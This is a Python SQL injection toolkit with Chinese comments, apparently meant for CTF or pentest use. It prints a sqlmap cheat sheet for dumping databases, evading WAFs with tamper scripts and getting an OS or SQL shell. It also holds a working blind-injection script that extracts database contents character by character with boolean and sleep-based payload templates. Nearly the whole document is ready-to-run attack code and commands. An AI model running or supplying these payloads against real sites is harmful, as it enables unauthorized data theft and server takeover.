#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: SQL 注入工具包 —— --cheat 打印 sqlmap 常用命令组合速查(不动真格);
     --blind 用 requests 驱动一个布尔/时间盲注脚本, 按 payload 模板逐字符拖库
适用条件:
    - 已定位注入点(单引号报错/and 1=1 差异/sleep 延迟)
    - 盲注: 页面有稳定的真/假特征 或 可用 sleep 差异
用法:
    python web_sqlmap_kit.py --cheat                       # 速查命令组合
    python web_sqlkit.py --blind --url "http://t/?id={payload}" \
        --template "1' and ascii(substr(({query}),{pos},1)){op}{num})-- -" \
        --true-mark "Welcome" --query "select database()"
    时间盲注加 --time-based(特征改为响应耗时阈值)
"""
import argparse
import time
import requests

CHEAT = """
sqlmap 常用组合速查(按场景挑):
  基础探测   sqlmap -u "http://t/?id=1" --batch
  POST 表单  sqlmap -u "http://t/login" --data "u=a&p=b" --batch
  指定注入位 sqlmap -u URL -p id --batch
  拖库       sqlmap -u URL -D dbname --tables / -T users --columns / -T users --dump
  cookie 注入 sqlmap -u URL --cookie="id=1*" --batch        (加 * 标注入点)
  请求复用   sqlmap -u URL -r request.txt --batch
  tamper 绕 WAF:
    空格被拦   --tamper=space2comment
    =被拦      --tamper=equaltolike
    引号被拦   --tamper=charbase64 / between
    通用组合   --tamper=space2comment,between --random-agent --delay=1
  高阶:
    堆叠      --technique=S --sql-shell
    报错读取  --technique=E --dump
    os-shell  --os-shell (需 root+secure_file_prefs 宽松)
    二阶注入  --second-url "http://t/show" -r request.txt
  SQLite     --dbms=sqlite --tables (无 information_schema, 用 sqlite_master)
"""

# 可打印 ASCII, 默认从常见 flag 字符开始能省一半请求
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_-{}.,@:!#$%&()*+/=<>?[]^~| "


def send(url, proxy, timeout):
    sess = requests.Session()
    if proxy:
        sess.proxies = {"http": proxy, "https": proxy}
    return sess.get(url, timeout=timeout)


def boolean_probe(url, proxy, true_mark):
    """布尔判定: 响应含 true_mark 视为真"""
    try:
        return true_mark in send(url, proxy, 10).text
    except requests.RequestException:
        return False


def time_probe(url, proxy, threshold):
    """时间判定: 响应耗时 >= threshold 视为真"""
    t0 = time.time()
    try:
        send(url, proxy, threshold + 10)
    except requests.RequestException:
        pass
    return time.time() - t0 >= threshold


def blind(template, query, url_base, true_mark, time_based, threshold, proxy):
    """逐字符二分: 模板里 {query} 注入子查询, {pos} 字符位置, {op}/{num} 比较子"""
    result = ""
    for pos in range(1, 100):                     # 拖到 100 字符, 空字符自动停
        lo, hi = 0, 255
        found = ""
        while lo <= hi:
            mid = (lo + hi) // 2
            # 先测 > mid, 再二分逼近
            if time_based:
                pay = template.format(query=query, pos=pos, op=">", num=mid)
                hit = time_probe(url_base.replace("{payload}", pay), proxy, threshold)
            else:
                pay = template.format(query=query, pos=pos, op=">", num=mid)
                hit = boolean_probe(url_base.replace("{payload}", pay), proxy, true_mark)
            if hit:
                lo = mid + 1
            else:
                hi = mid - 1
        code = lo
        if code <= 32:                             # 空字符/不可见字符, 认为拖完了
            break
        found = chr(code)
        result += found
        print(f"[*] pos={pos} -> {found} | 当前结果: {result}")
    print(f"[+] 拖取完成: {result}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description="SQL 注入速查 + 盲注脚本")
    ap.add_argument("--cheat", action="store_true", help="打印 sqlmap 命令速查")
    ap.add_argument("--blind", action="store_true", help="启用盲注拖库")
    ap.add_argument("--url", help='注入 URL, 用 {payload} 占位, 如 http://t/?id={payload}')
    ap.add_argument("--template", default="1' and ascii(substr(({query}),{pos},1)){op}{num})-- -",
                    help="payload 模板, 占位符 {query}/{pos}/{op}/{num}")
    ap.add_argument("--query", default="select database()", help="要拖的子查询")
    ap.add_argument("--true-mark", default="", help="布尔盲注真页面特征串")
    ap.add_argument("--time-based", action="store_true", help="时间盲注(模板里自己带 sleep)")
    ap.add_argument("--threshold", type=float, default=3.0, help="时间盲注耗时阈值(秒)")
    ap.add_argument("--proxy", help="代理 http://127.0.0.1:8080")
    args = ap.parse_args()

    if args.cheat or (not args.blind):
        print(CHEAT)
    if args.blind:
        assert args.url and "{payload}" in args.url, "--url 必须含 {payload} 占位符"
        if args.time_based:
            # 时间盲注模板示例: 1' and if(ascii(substr(({query}),{pos},1)){op}{num},sleep(3),0)-- -
            args.template = "1' and if(ascii(substr(({query}),{pos},1)){op}{num},sleep(3),0)-- -"
            args.true_mark = ""
        blind(args.template, args.query, args.url, args.true_mark,
              args.time_based, args.threshold, args.proxy)
